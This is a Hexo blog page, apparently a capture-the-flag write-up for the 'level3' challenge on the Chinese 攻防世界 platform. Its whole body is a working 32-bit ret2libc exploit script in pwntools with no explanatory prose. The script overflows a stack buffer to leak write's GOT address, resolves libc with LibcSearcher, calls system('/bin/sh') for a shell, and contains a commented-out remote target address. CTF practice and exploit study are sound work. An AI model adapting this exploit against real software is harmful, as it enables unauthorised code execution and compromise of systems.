<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  
    <meta name="author" content="John Doe">
  
  
    <meta name="description" content="libc32位level3——攻防世界1234567891011121314151617181920212223from pwn import*from LibcSearcher import*#r=remote(&amp;#x27;111.200.241.244&amp;#x27;,&amp;#x27;55820&amp;#x27;)elf=ELF(&amp;#x27;./level3&amp;#x27;)r=process(&amp;#x27;./">
  
  <meta name="description" content="libc32位level3——攻防世界1234567891011121314151617181920212223from pwn import*from LibcSearcher import*#r&#x3D;remote(&amp;#x27;111.200.241.244&amp;#x27;,&amp;#x27;55820&amp;#x27;)elf&#x3D;ELF(&amp;#x27;.&#x2F;level3&amp;#x27;)r&#x3D;process(&amp;#x27;.&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2021/03/16/libc/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="libc32位level3——攻防世界1234567891011121314151617181920212223from pwn import*from LibcSearcher import*#r&#x3D;remote(&amp;#x27;111.200.241.244&amp;#x27;,&amp;#x27;55820&amp;#x27;)elf&#x3D;ELF(&amp;#x27;.&#x2F;level3&amp;#x27;)r&#x3D;process(&amp;#x27;.&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-03-16T13:09:38.333Z">
<meta property="article:modified_time" content="2021-04-10T05:47:39.143Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div class="wrapper">
    <header id="header">
  <div class="title">
    <h1><a href="/">Hexo</a></h1>
    <p><a href="/"></a></p>
  </div>
  <nav class="nav">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
      
        <li><a href="/atom.xml">RSS</a></li>
      
    </ul>
    <div class="clearfix"></div>
  </nav>
  <div class="clearfix"></div>
</header>
    <div class="content"><article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2021/03/16/libc/">
  <time datetime="2021-03-16T13:09:38.333Z">
    2021-03-16
  </time>
</a>
    
    
  
    <h1 class="title"></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="level3——攻防世界"><a href="#level3——攻防世界" class="headerlink" title="level3——攻防世界"></a>level3——攻防世界</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#r=remote(&#x27;111.200.241.244&#x27;,&#x27;55820&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08048484</span></span><br><span class="line"></span><br><span class="line">p=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">write_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">1</span>)+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>​      </p>

    
  </div>
  <footer>
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>

</div>
  </div>
  <footer id="footer"><div class="copyright">
  
  &copy; 2021 <a href="/">John Doe</a>
  
</div>
<div class="theme-copyright">
  Theme by <a href="https://github.com/orderedlist" target="_blank">orderedlist</a>
   | 
  Redesign by <a href="http://heroicyang.com/" target="_blank">Heroic Yang</a>
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script src="/js/scale.fix.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
  (function($){
    $('.fancybox').fancybox();
  })(jQuery);
</script>

</body>
</html>